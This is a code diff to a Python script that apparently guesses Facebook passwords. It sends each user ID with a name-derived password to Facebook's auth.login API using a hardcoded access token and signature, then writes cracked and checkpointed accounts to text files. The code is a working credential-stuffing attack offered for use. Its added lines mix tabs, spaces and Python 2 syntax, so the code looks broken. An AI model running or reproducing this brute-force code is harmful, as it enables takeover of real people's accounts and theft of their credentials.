@@ -603,20 +603,66 @@ def a_s():
         uid, name = user.split('|')
         try:
             pass1 = name.lower() + p1
-            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
-            q = json.loads(data)
-            if 'loc' in q:
-                print '\x1b[1;92m[RANA-OK] ' + uid + ' | ' + pass1
-                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                ok.write(uid + ' | ' + pass1 + '\n')
-                ok.close()
-                oks.append(uid + pass1)
-            elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;93m[RANA-CP] ' + uid + ' | ' + pass1
-                cp = open('HOP_CP.txt', 'a')
-                cp.write(uid + ' | ' + pass1 + '\n')
-                cp.close()
-                cps.append(uid + pass1)
+            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		    d=json.loads(q)
+
+ 
+
+		    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		        print("\033[1;93m[Altaf>CP] "+uid+" = "+pass1)
+
+ 
+
+		        cp=open("mzcp.txt","a")
+
+ 
+
+		        cp.write(uid+" = "+pass1+"\n")
+
+ 
+
+		        cp.close()
+
+ 
+
+		        cps.append(uid)
+
+ 
+
+		    else:
+
+ 
+
+		    	if "access_token" in d:
+
+ 
+
+		            print("\x1b[1;97m[Altaf = OK] "+uid+" = "+pass1+"\x1b[1;0m")
+
+ 
+
+		            ok=open("mzok.txt","a")
+
+ 
+
+		            ok.write(uid+" = "+pass1+"\n")
+
+ 
+
+		            ok.close()
+
+ 
+
+		            oks.append(uid)
+
+ 
+            
             else:
                 pass2 = name.lower() + p2
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
